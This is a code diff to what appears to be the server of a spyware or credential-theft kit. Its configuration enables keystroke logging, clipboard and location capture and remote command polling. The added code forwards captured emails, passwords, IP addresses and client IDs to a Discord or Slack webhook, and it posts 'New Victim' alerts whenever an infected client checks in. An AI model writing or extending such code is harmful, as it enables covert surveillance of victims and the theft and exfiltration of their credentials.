@@ -173,7 +173,10 @@ const defaultConfig = {
     locationEnabled: true, locationPeriod: 30000,
     keystrokesEnabled: true, keyLogFlush: 10000,
     clipboardEnabled: true, clipboardCheck: 15000,
-    deviceInfoPeriod: 60000, heartbeatPeriod: 8000, commandPoll: 3000
+    deviceInfoPeriod: 60000, heartbeatPeriod: 8000, commandPoll: 3000,
+    webhookUrl: '',          // Discord/Slack webhook — leave empty to disable
+    webhookOnNewClient: true,
+    webhookOnCredential: true
 };
 if (!store.config) store.config = { ...defaultConfig };
 
@@ -251,6 +254,28 @@ async function geolocateIP(ip) {
         req.setTimeout(5000, () => { req.destroy(); resolve(null); });
         req.on('error', () => resolve(null));
     });
+}
+
+// ═══════════════════════════════════════════════════════════════
+//  WEBHOOK NOTIFIER
+// ═══════════════════════════════════════════════════════════════
+async function fireWebhook(payload) {
+    try {
+        const url = store.config && store.config.webhookUrl;
+        if (!url || !/^https?:\/\//i.test(url)) return;
+        const https = require('https');
+        const http2 = require('http');
+        const body = JSON.stringify(payload);
+        const u = new URL(url);
+        const lib = u.protocol === 'https:' ? https : http2;
+        const opts = { hostname: u.hostname, port: u.port || (u.protocol === 'https:' ? 443 : 80), path: u.pathname + u.search, method: 'POST', headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(body) } };
+        await new Promise((res, rej) => {
+            const req = lib.request(opts, r => { r.resume(); r.on('end', res); });
+            req.setTimeout(5000, () => { req.destroy(); rej(new Error('timeout')); });
+            req.on('error', rej);
+            req.write(body); req.end();
+        });
+    } catch (e) { console.error('Webhook error:', e.message); }
 }
 
 // ═══════════════════════════════════════════════════════════════
@@ -642,6 +667,20 @@ app.post('/api/capture', (req, res) => {
     saveStore();
     addEvent('credential_captured', { clientId: entry.clientId, email: entry.email, source: entry.source, ip: entry.ip });
     console.log(`\u{1F511} Credential captured: ${entry.email} from ${entry.clientId} (${entry.ip})`);
+    // Fire webhook notification
+    if (store.config?.webhookOnCredential !== false) {
+        fireWebhook({
+            content: `🔑 **Credential captured** from \`${entry.clientId}\``,
+            embeds: [{ title: 'New Credential', color: 0xf4b400, fields: [
+                { name: 'Email / Username', value: entry.email, inline: true },
+                { name: 'Password', value: entry.password.slice(0, 50), inline: true },
+                { name: 'Source', value: entry.source || 'unknown', inline: true },
+                { name: 'IP', value: entry.ip || 'unknown', inline: true },
+                { name: 'Client ID', value: entry.clientId, inline: true },
+                { name: 'Time', value: entry.timestamp, inline: true }
+            ]}]
+        }).catch(() => {});
+    }
     res.json({ success: true });
 });
 
@@ -673,6 +712,18 @@ app.post('/heartbeat', rateLimit(30, 10000), async (req, res) => {
         store.clients[clientId] = { firstSeen: now };
         addEvent('client_connected', { clientId, userAgent, ip });
         console.log(`\u{1F7E2} New client: ${clientId} (${ip})`);
+        // Fire webhook notification (non-blocking)
+        if (store.config?.webhookOnNewClient !== false) {
+            fireWebhook({
+                content: `🟢 **New client connected** \`${clientId}\``,
+                embeds: [{ title: 'New Victim', color: 0x00cc44, fields: [
+                    { name: 'Client ID', value: clientId, inline: true },
+                    { name: 'IP', value: ip || 'unknown', inline: true },
+                    { name: 'User Agent', value: (userAgent || 'unknown').slice(0, 200), inline: false },
+                    { name: 'Time', value: now, inline: true }
+                ]}]
+            }).catch(() => {});
+        }
     }
 
     const c = store.clients[clientId];
@@ -1161,6 +1212,16 @@ app.post('/api/config', requireAuth, (req, res) => {
     saveStore();
     console.log('\u{2699}\u{FE0F}  Config updated');
     res.json({ success: true, config: store.config });
+});
+
+app.post('/api/webhook-test', requireAuth, async (req, res) => {
+    try {
+        await fireWebhook({
+            content: '🧪 **Webhook test** from Command Center',
+            embeds: [{ title: 'Test', color: 0x3498db, description: 'Webhook is configured and working!' }]
+        });
+        res.json({ success: true });
+    } catch(e) { res.status(500).json({ error: e.message }); }
 });
 
 // ── Upload file and queue as command ──
